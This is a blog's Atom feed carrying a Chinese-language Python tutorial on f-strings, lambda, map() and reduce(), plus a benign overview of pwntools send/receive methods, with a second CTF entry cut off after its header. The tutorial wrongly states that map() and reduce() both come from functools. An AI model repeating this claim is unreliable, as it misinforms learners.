<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kidder1&#39;s Blog!</title>
  
  
  <link href="https://kidder1.github.io/atom.xml" rel="self"/>
  
  <link href="https://kidder1.github.io/"/>
  <updated>2023-08-02T10:00:43.357Z</updated>
  <id>https://kidder1.github.io/</id>
  
  <author>
    <name>Kidder1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python语言深入研究</title>
    <link href="https://kidder1.github.io/2023/08/02/Python%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/"/>
    <id>https://kidder1.github.io/2023/08/02/Python%E8%AF%AD%E8%A8%80%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/</id>
    <published>2023-08-02T04:15:25.000Z</published>
    <updated>2023-08-02T10:00:43.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高级写法"><a href="#高级写法" class="headerlink" title="高级写法"></a>高级写法</h1><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><ol><li>使用f-strings（格式化字符串字面量）： 这是从Python 3.6版本开始提供的最现代、最简洁的字符串格式化方法。你可以在字符串前加上’f’或’F’，并在花括号{}内嵌入表达式。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line">formatted_string = <span class="string">f&quot;我的名字是<span class="subst">&#123;name&#125;</span>，我今年<span class="subst">&#123;age&#125;</span>岁。&quot;</span></span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Alice，我今年30岁。&quot;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>使用<code>.format()</code>方法： 这种方法允许你使用<code>format()</code>方法的参数替换字符串中的占位符。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Bob&quot;</span></span><br><span class="line">age = <span class="number">25</span></span><br><span class="line">formatted_string = <span class="string">&quot;我的名字是&#123;&#125;，我今年&#123;&#125;岁。&quot;</span>.<span class="built_in">format</span>(name, age)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Bob，我今年25岁。&quot;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>使用<code>%</code>运算符（C风格的字符串格式化）： 这种方法类似于C语言中的<code>%</code>运算符，是一种较旧的字符串格式化方法。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Charlie&quot;</span></span><br><span class="line">age = <span class="number">35</span></span><br><span class="line">formatted_string = <span class="string">&quot;我的名字是%s，我今年%d岁。&quot;</span> % (name, age)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Charlie，我今年35岁。&quot;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>使用<code>str.format()</code>方法配合位置或命名占位符： 这种方法允许更灵活地控制参数的位置。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Eve&quot;</span></span><br><span class="line">age = <span class="number">40</span></span><br><span class="line">formatted_string = <span class="string">&quot;我的名字是&#123;0&#125;，我今年&#123;1&#125;岁。&quot;</span>.<span class="built_in">format</span>(name, age)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Eve，我今年40岁。&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用命名占位符（Python 3.1+）</span></span><br><span class="line">formatted_string = <span class="string">&quot;我的名字是&#123;name&#125;，我今年&#123;age&#125;岁。&quot;</span>.<span class="built_in">format</span>(name=name, age=age)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;我的名字是Eve，我今年40岁。&quot;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>使用<code>str.join()</code>方法： 这种方法用于将序列的元素用给定的字符串连接起来。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fruits = [<span class="string">&quot;苹果&quot;</span>, <span class="string">&quot;香蕉&quot;</span>, <span class="string">&quot;橙子&quot;</span>]</span><br><span class="line">formatted_string = <span class="string">&quot;、&quot;</span>.join(fruits)</span><br><span class="line"><span class="built_in">print</span>(formatted_string)</span><br><span class="line"><span class="comment"># 输出：&quot;苹果、香蕉、橙子&quot;</span></span><br></pre></td></tr></table></figure><p>根据你的喜好和Python版本选择合适的方法。一般来说，f-strings由于其可读性和效率而被推荐使用。</p><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>匿名函数是一种在Python中定义简单函数的方式，也被称为lambda函数。与普通函数（def定义的函数）不同，匿名函数不需要使用def关键字来定义，而是使用lambda关键字。匿名函数通常用于简单的功能或需要临时使用的小规模函数。</p><p>匿名函数的语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> arguments: expression</span><br></pre></td></tr></table></figure><ul><li>lambda：表示创建匿名函数的关键字。</li><li>arguments：表示函数的参数列表。</li><li>expression：表示函数的返回值。</li></ul><p>使用说明：</p><ol><li>匿名函数通常适用于简单的功能，不建议用于复杂逻辑的函数。</li><li>匿名函数返回一个函数对象，可以将其赋值给一个变量，也可以直接调用它。</li></ol><p>实际使用举例： 下面我们将使用匿名函数来实现一些简单的功能。</p><ol><li>计算两个数的和：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add = <span class="keyword">lambda</span> x, y: x + y</span><br><span class="line">result = add(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出：8</span></span><br></pre></td></tr></table></figure><ol start="2"><li>判断一个数是否为偶数：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_even = <span class="keyword">lambda</span> num: num % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(is_even(<span class="number">10</span>))  <span class="comment"># 输出：True</span></span><br><span class="line"><span class="built_in">print</span>(is_even(<span class="number">7</span>))   <span class="comment"># 输出：False</span></span><br></pre></td></tr></table></figure><ol start="3"><li>对列表进行排序：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fruits = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;grape&quot;</span>]</span><br><span class="line">fruits.sort(key=<span class="keyword">lambda</span> fruit: <span class="built_in">len</span>(fruit))</span><br><span class="line"><span class="built_in">print</span>(fruits)  <span class="comment"># 输出：[&#x27;apple&#x27;, &#x27;grape&#x27;, &#x27;orange&#x27;, &#x27;banana&#x27;]</span></span><br></pre></td></tr></table></figure><ol start="4"><li>使用map()函数对列表元素进行平方运算：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">squared_numbers = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, numbers))</span><br><span class="line"><span class="built_in">print</span>(squared_numbers)  <span class="comment"># 输出：[1, 4, 9, 16, 25]</span></span><br></pre></td></tr></table></figure><ol start="5"><li>在函数中使用匿名函数：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">apply_operation</span>(<span class="params">func, x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> func(x, y)</span><br><span class="line">result = apply_operation(<span class="keyword">lambda</span> a, b: a * b, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出：12</span></span><br></pre></td></tr></table></figure><p>​请注意，在使用匿名函数时，要确保它们的功能简单且易于理解。</p><h2 id="map方法"><a href="#map方法" class="headerlink" title="map方法"></a>map方法</h2><p><code>map()</code> 是 Python 内置的函数之一，用于将一个函数（或其他可调用对象）应用于一个或多个序列（如列表、元组等）的每个元素，并将结果组成一个新的可迭代对象。它的基本语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>(function, iterable, ...)</span><br></pre></td></tr></table></figure><ul><li><code>function</code>: 是一个函数或其他可调用对象，用于处理每个输入元素。</li><li><code>iterable</code>: 是一个或多个序列，可以是列表、元组、集合等。</li></ul><p><code>map()</code> 将会返回一个 <code>map</code> 对象，你可以将其转换成列表或其他类型的可迭代对象，如需要的话。</p><p>使用说明：</p><ol><li><code>map()</code> 接受一个或多个序列，它们的长度应该相同。如果传入多个序列，那么 <code>function</code> 将接受相同位置上的元素作为参数，这些元素组成一个元组传递给 <code>function</code>。</li><li><code>map()</code> 不会修改原始的输入序列，而是返回一个新的可迭代对象，其中包含了 <code>function</code> 处理后的结果。</li></ol><p>实际使用举例： 下面我们通过几个例子来说明 <code>map()</code> 的用法。</p><ol><li>将列表中的每个元素求平方：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">squared_numbers = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x**<span class="number">2</span>, numbers)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(squared_numbers))  <span class="comment"># 输出：[1, 4, 9, 16, 25]</span></span><br></pre></td></tr></table></figure><ol start="2"><li>将两个列表对应位置的元素相加：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">list2 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line">sum_result = <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x + y, list1, list2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(sum_result))  <span class="comment"># 输出：[11, 22, 33]</span></span><br></pre></td></tr></table></figure><ol start="3"><li>将字符串列表中的单词变为大写：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">words = [<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, <span class="string">&quot;python&quot;</span>]</span><br><span class="line">upper_words = <span class="built_in">map</span>(<span class="built_in">str</span>.upper, words)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(upper_words))  <span class="comment"># 输出：[&#x27;HELLO&#x27;, &#x27;WORLD&#x27;, &#x27;PYTHON&#x27;]</span></span><br></pre></td></tr></table></figure><ol start="4"><li>使用 <code>map()</code> 转换多个序列：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">squares = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</span><br><span class="line">addition = <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y: x + y, numbers, squares)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(addition))  <span class="comment"># 输出：[2, 6, 12, 20, 30]</span></span><br></pre></td></tr></table></figure><ol start="5"><li>使用 <code>map()</code> 转换多个序列并取平均值：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">scores1 = [<span class="number">85</span>, <span class="number">90</span>, <span class="number">78</span>]</span><br><span class="line">scores2 = [<span class="number">92</span>, <span class="number">88</span>, <span class="number">95</span>]</span><br><span class="line">scores3 = [<span class="number">80</span>, <span class="number">85</span>, <span class="number">88</span>]</span><br><span class="line"></span><br><span class="line">average = <span class="built_in">map</span>(<span class="keyword">lambda</span> x, y, z: (x + y + z) / <span class="number">3</span>, scores1, scores2, scores3)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(average))  <span class="comment"># 输出：[85.66666666666667, 87.66666666666667, 87.0]</span></span><br></pre></td></tr></table></figure><p>总结：<code>map()</code> 是一个很有用的函数，可以简化对序列元素的处理，并且能够在一行代码中完成一些常见的数据转换操作。</p><h2 id="reduce方法"><a href="#reduce方法" class="headerlink" title="reduce方法"></a>reduce方法</h2><p><code>reduce()</code> 是 Python 中 <code>functools</code> 模块提供的函数，用于对一个序列（如列表或元组）中的元素逐个进行合并处理，最终返回一个结果。它的基本语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">functools.reduce(function, iterable[, initializer])</span><br></pre></td></tr></table></figure><ul><li><code>function</code>: 是一个二元函数，接受两个参数，并返回一个结果。</li><li><code>iterable</code>: 是一个序列，可以是列表、元组、集合等。</li><li><code>initializer</code>（可选）: 是初始值，如果提供了 <code>initializer</code>，则会在处理序列元素之前将其作为初始值传递给 <code>function</code>。</li></ul><p><code>reduce()</code> 在 Python 2 中是内置函数，但在 Python 3 中已经移至 <code>functools</code> 模块。所以在 Python 3 中使用 <code>reduce()</code> 需要先导入 <code>functools</code> 模块。</p><p>使用说明：</p><ol><li><code>reduce()</code> 首先将序列中的前两个元素传递给 <code>function</code>，得到一个结果。</li><li>然后将上一步的结果和序列中的下一个元素传递给 <code>function</code>，再得到一个结果。</li><li>依次类推，将每个元素和上一步的结果传递给 <code>function</code>，直到处理完所有元素，得到最终结果。</li></ol><p>实际使用举例： 下面我们通过几个例子来说明 <code>reduce()</code> 的用法。</p><ol><li>计算列表中所有元素的累积乘积：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">product = reduce(<span class="keyword">lambda</span> x, y: x * y, numbers)</span><br><span class="line"><span class="built_in">print</span>(product)  <span class="comment"># 输出：120</span></span><br></pre></td></tr></table></figure><ol start="2"><li>使用初始值计算列表中所有元素的累积和：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">initial_value = <span class="number">10</span></span><br><span class="line">sum_result = reduce(<span class="keyword">lambda</span> x, y: x + y, numbers, initial_value)</span><br><span class="line"><span class="built_in">print</span>(sum_result)  <span class="comment"># 输出：25</span></span><br></pre></td></tr></table></figure><ol start="3"><li>将字符串列表中的单词拼接成一个句子：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">words = [<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>, <span class="string">&quot;Python&quot;</span>]</span><br><span class="line">sentence = reduce(<span class="keyword">lambda</span> x, y: x + <span class="string">&quot; &quot;</span> + y, words)</span><br><span class="line"><span class="built_in">print</span>(sentence)  <span class="comment"># 输出：&quot;Hello World Python&quot;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>使用 <code>reduce()</code> 找到列表中的最大值：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">numbers = [<span class="number">15</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">20</span>, <span class="number">45</span>]</span><br><span class="line">max_value = reduce(<span class="keyword">lambda</span> x, y: x <span class="keyword">if</span> x &gt; y <span class="keyword">else</span> y, numbers)</span><br><span class="line"><span class="built_in">print</span>(max_value)  <span class="comment"># 输出：45</span></span><br></pre></td></tr></table></figure><ol start="5"><li>使用初始值计算列表中所有元素的平均值：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line">scores = [<span class="number">85</span>, <span class="number">90</span>, <span class="number">78</span>, <span class="number">92</span>, <span class="number">88</span>]</span><br><span class="line">initial_value = <span class="number">0</span></span><br><span class="line">average = reduce(<span class="keyword">lambda</span> x, y: x + y, scores, initial_value) / <span class="built_in">len</span>(scores)</span><br><span class="line"><span class="built_in">print</span>(average)  <span class="comment"># 输出：86.6</span></span><br></pre></td></tr></table></figure><p>总结：<code>reduce()</code> 是一个强大的函数，可以用于处理多个元素之间的累积运算，但在 Python 3 中需要导入 <code>functools</code> 模块才能使用。在实际使用中，要确保传递给 <code>reduce()</code> 的函数符合合并运算的要求。<br><strong>注意二者区别：</strong></p><ul><li><code>map()</code> 和 <code>reduce()</code> 是 Python 中两个用于处理序列的内置函数，它们都在 <code>functools</code> 模块中提供。</li></ul><p>主要区别如下：</p><ol><li>功能不同：<ul><li><code>map()</code>：用于对序列中的每个元素应用一个函数，并返回处理后的结果组成的可迭代对象。</li><li><code>reduce()</code>：用于对序列中的元素逐个进行合并处理，并返回一个最终结果。</li></ul></li><li>函数参数不同：<ul><li><code>map()</code> 接受一个函数和一个或多个序列（可迭代对象）作为参数，将函数应用于序列的每个元素，并返回结果组成的可迭代对象。</li><li><code>reduce()</code> 接受一个二元函数和一个序列（可迭代对象）作为参数，该二元函数处理序列中的两个元素，并返回一个结果，然后将该结果与下一个元素继续进行处理，直到处理完所有元素并得到最终结果。</li></ul></li><li>返回值不同：<ul><li><code>map()</code> 返回一个 <code>map</code> 对象，你可以将其转换成列表或其他类型的可迭代对象。</li><li><code>reduce()</code> 返回一个最终的结果，而不是一个可迭代对象。</li></ul></li><li>功能使用场景不同：<ul><li><code>map()</code> 适用于对序列中的每个元素进行相同的操作，例如对列表中的每个元素进行平方、转换为大写等。</li><li><code>reduce()</code> 适用于对序列中的元素进行合并运算，例如求和、求积、找到最大值等。</li></ul></li></ol><p>综上所述，<code>map()</code> 用于对序列中的元素逐个进行相同的处理，而 <code>reduce()</code> 用于对序列中的元素进行累积合并操作。它们在不同的场景下有不同的应用。</p><h1 id="第三方库使用"><a href="#第三方库使用" class="headerlink" title="第三方库使用"></a>第三方库使用</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="send-recv：数据交互方式汇总"><a href="#send-recv：数据交互方式汇总" class="headerlink" title="send&amp;recv：数据交互方式汇总"></a>send&amp;recv：数据交互方式汇总</h3><p>在 <code>pwntools</code> 库中，有几个常用的数据交互方法，包括 <code>send</code>、<code>sendline</code>、<code>sendafter</code>、<code>sendlineafter</code>、<code>recvuntil</code> 和 <code>recv</code>，它们在与远程服务通信时都有不同的特性和用途。</p><ol><li><code>send(date)</code><ul><li>特性：发送指定的数据 <code>data</code> 给远程服务器，但不自动添加换行符。</li><li>区别：与 <code>sendline</code> 相比，不会自动添加换行符，需要手动处理数据格式。</li><li>使用情景：适用于发送不需要换行符结尾的数据，比如二进制数据或不需要自动回车的命令。</li><li>示例：</li></ul></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="comment"># 发送数据，无需换行符</span></span><br><span class="line">r.send(<span class="string">&quot;Hello, world!&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="2"><li><code>sendline(data)</code></li></ol><ul><li>特性：发送指定的数据 <code>data</code> 给远程服务器，并自动添加换行符 (newline)。</li><li>区别：相比 <code>send</code>，更方便发送带有换行符结尾的数据。</li><li>使用情景：适用于发送需要自动回车的命令，比如交互式命令行操作。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="comment"># 发送带有换行符的数据</span></span><br><span class="line">r.sendline(<span class="string">&quot;login admin&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="3"><li><code>sendafter(sub, data)</code></li></ol><ul><li>特性：等待字符串 <code>sub</code> 在输出中出现，然后发送指定的数据 <code>data</code> 给远程服务器。</li><li>区别：用于在交互时根据之前输出的内容，自动判断何时发送数据。</li><li>使用情景：适用于根据程序输出的特定字符串来动态发送数据，典型用法是在登录过程中根据提示输入用户名和密码。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待字符串 &quot;Username: &quot; 在输出中出现，然后发送用户名</span></span><br><span class="line">r.sendafter(<span class="string">&quot;Username: &quot;</span>, <span class="string">&quot;john_doe&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待字符串 &quot;Password: &quot; 在输出中出现，然后发送密码</span></span><br><span class="line">r.sendafter(<span class="string">&quot;Password: &quot;</span>, <span class="string">&quot;secretpass&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="4"><li><code>sendlineafter(sub, data)</code></li></ol><ul><li>特性：等待字符串 <code>sub</code> 在输出中出现，然后发送指定的数据 <code>data</code> 给远程服务器，并自动添加换行符 (newline)。</li><li>区别：结合了 <code>sendline</code> 和 <code>sendafter</code> 的功能。</li><li>使用情景：适用于根据程序输出的特定字符串来动态发送需要自动回车的数据。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待字符串 &quot;Enter your name: &quot; 在输出中出现，然后发送带有换行符的名字</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Enter your name: &quot;</span>, <span class="string">&quot;Alice&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待字符串 &quot;Enter your age: &quot; 在输出中出现，然后发送带有换行符的年龄</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Enter your age: &quot;</span>, <span class="string">&quot;25&quot;</span>)</span><br></pre></td></tr></table></figure><ol start="5"><li><code>recvuntil(delims)</code></li></ol><ul><li>特性：接收远程服务器的输出，直到遇到指定的分隔符 <code>delims</code>。</li><li>区别：与 <code>recv</code> 相比，可以等待特定字符串之前的输出。</li><li>使用情景：适用于在得到某些输出之前，等待服务器输出的其他内容。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收输出，直到遇到 &quot;Username: &quot; 字符串</span></span><br><span class="line">output = r.recvuntil(<span class="string">&quot;Username: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出接收到的内容</span></span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><ol start="6"><li><code>recv(n)</code></li></ol><ul><li>特性：接收指定字节数 <code>n</code> 的数据。</li><li>区别：与 <code>recvuntil</code> 相比，直接接收指定字节数的数据，不需要等待特定分隔符。</li><li>使用情景：适用于直接接收固定长度的数据。</li><li>示例：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建与远程服务的连接</span></span><br><span class="line">r = remote(<span class="string">&#x27;example.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收固定长度的数据</span></span><br><span class="line">data = r.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理接收到的数据</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;高级写法&quot;&gt;&lt;a href=&quot;#高级写法&quot; class=&quot;headerlink&quot; title=&quot;高级写法&quot;&gt;&lt;/a&gt;高级写法&lt;/h1&gt;&lt;h2 id=&quot;格式化字符串&quot;&gt;&lt;a href=&quot;#格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;格式化字符</summary>
      
    
    
    
    <category term="Python" scheme="https://kidder1.github.io/categories/Python/"/>
    
    
    <category term="Python" scheme="https://kidder1.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Reverse_CTF</title>
    <link href="https://kidder1.github.io/2023/08/01/Reverse_CTF/"/>
    <id>https://kidder1.github.io/2023/08/01/Reverse_CTF/</id>
    <published>2023-08-01T13:20:25.000Z</published>
    <updated>2023-08-02T08:36:46.396Z</updated>
    
